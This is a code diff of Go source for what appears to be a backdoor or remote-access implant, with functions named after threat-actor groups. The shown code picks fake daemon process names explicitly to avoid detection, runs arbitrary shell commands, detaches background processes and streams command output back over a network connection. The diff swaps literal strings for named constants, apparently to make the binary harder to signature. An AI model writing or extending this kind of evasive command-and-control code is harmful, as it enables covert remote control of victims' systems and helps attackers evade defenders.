@@ -158,7 +158,7 @@ func turla(n int) string {
 // Combines common daemon names with random suffix to avoid detection.
 // Returns: String like "syncd-a7x2" or "crond-9k1m"
 func kimsuky() string {
-	dict := []string{"update", "syncd", "logger", "system", "crond", "netd"}
+	dict := camoNames
 	return dict[rand.Intn(len(dict))] + "-" + turla(4)
 }
 
@@ -173,7 +173,7 @@ func kimsuky() string {
 //
 // Returns: Combined stdout/stderr output, and error if command failed
 func sidewinder(cmd string) (string, error) {
-	args := []string{"sh", "-c", cmd}
+	args := []string{shellBin, shellFlag, cmd}
 	command := exec.Command(args[0], args[1:]...)
 	var stdout, stderr bytes.Buffer
 	command.Stdout = &stdout
@@ -196,7 +196,7 @@ func sidewinder(cmd string) (string, error) {
 //   - cmd: Shell command string to execute in background
 func oceanLotus(cmd string) {
 	go func() {
-		args := []string{"sh", "-c", cmd}
+		args := []string{shellBin, shellFlag, cmd}
 		command := exec.Command(args[0], args[1:]...)
 		command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
 		command.Stdout = nil
@@ -215,7 +215,7 @@ func oceanLotus(cmd string) {
 //
 // Returns: error if command setup fails
 func machete(cmd string, conn net.Conn) error {
-	args := []string{"sh", "-c", cmd}
+	args := []string{shellBin, shellFlag, cmd}
 	command := exec.Command(args[0], args[1:]...)
 	stdout, err := command.StdoutPipe()
 	if err != nil {
@@ -231,20 +231,20 @@ func machete(cmd string, conn net.Conn) error {
 	go func() {
 		scanner := bufio.NewScanner(stdout)
 		for scanner.Scan() {
-			conn.Write([]byte(fmt.Sprintf("STDOUT: %s\n", scanner.Text())))
+			conn.Write([]byte(fmt.Sprintf(protoStdoutFmt, scanner.Text())))
 		}
 	}()
 	go func() {
 		scanner := bufio.NewScanner(stderr)
 		for scanner.Scan() {
-			conn.Write([]byte(fmt.Sprintf("STDERR: %s\n", scanner.Text())))
+			conn.Write([]byte(fmt.Sprintf(protoStderrFmt, scanner.Text())))
 		}
 	}()
 	err = command.Wait()
 	if err != nil {
-		conn.Write([]byte(fmt.Sprintf("EXIT ERROR: %v\n", err)))
+		conn.Write([]byte(fmt.Sprintf(protoExitErrFmt, err)))
 	} else {
-		conn.Write([]byte("EXIT: Command completed successfully\n"))
+		conn.Write([]byte(protoExitOk))
 	}
 	return nil
 }
